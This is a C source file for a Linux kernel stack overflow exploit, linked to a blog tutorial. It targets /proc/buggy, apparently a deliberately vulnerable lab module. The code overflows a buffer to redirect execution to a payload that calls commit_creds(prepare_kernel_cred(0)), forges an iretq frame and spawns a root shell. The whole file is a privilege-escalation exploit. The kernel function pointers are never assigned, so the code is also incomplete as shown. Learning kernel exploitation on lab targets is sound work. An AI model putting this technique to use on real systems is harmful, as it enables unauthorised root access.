/*
 * Kernel stack overflow basics exploit
 * https://blog.0x80.org/kernel-stack-overflows-basics/
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/user.h>

#define STACK_SIZE (1024 * 1024)
char ownstack[STACK_SIZE];
struct fake_frame {
    void *rip;         // shell()
    uint64_t cs;       // %cs
    uint64_t rflags;   // rflags
    void *rsp;         // %rsp
    uint64_t ss;       // %ss
} __attribute__((packed)) ff;

void* (*prepare_kernel_cred)(void*)  __attribute__((regparm(3)));
void* (*commit_creds)(void*) __attribute__((regparm(3)));

void shell(void) {
    execl("/bin/sh", "sh", 0);
}

void payload(void) {
    commit_creds(prepare_kernel_cred(0));
    asm("mov $ff, %rsp;\n"
            "swapgs;\n"
            "iretq;");
}
/*
 * Setup the fake frame
 * |ss     | Lower
 * |rsp    |
 * |rflags |
 * |cs     |
 * |rip    |
 */
void setup_ff(void) {
    asm("xorq %rax, %rax;\n"
        "movw %cs, %ax;\n"
        "movq %rax, ff+8;\n"
        "pushfq;   popq ff+16;\n"
        "movw %ss, %ax;\n"
        "movq %rax, ff+32;\n");
    ff.rip = &shell;
    ff.rsp = ownstack + (STACK_SIZE / 2);
}

int main()
{
    FILE *fd;
    char buf[8*4];
    memset (buf, 'A', sizeof (buf));
    *((void**) (buf+8*3)) = &payload;
    int ret = 0;
    unsigned long addr;
    char dummy;
    char sname[512];
    
    // setup fake frame
    fprintf(stdout, "[+] preparing fake frame");
    setup_ff();

    // write payload
    fprintf(stdout, "[+] writing payload to /proc/buggy");
    fd = fopen("/proc/buggy", "w");
    if(fd == NULL) {
        perror("fopen()");
        return -1;
    }
    fwrite(buf, sizeof(buf), 1, fd);
    fclose(fd);

    return 0;
}
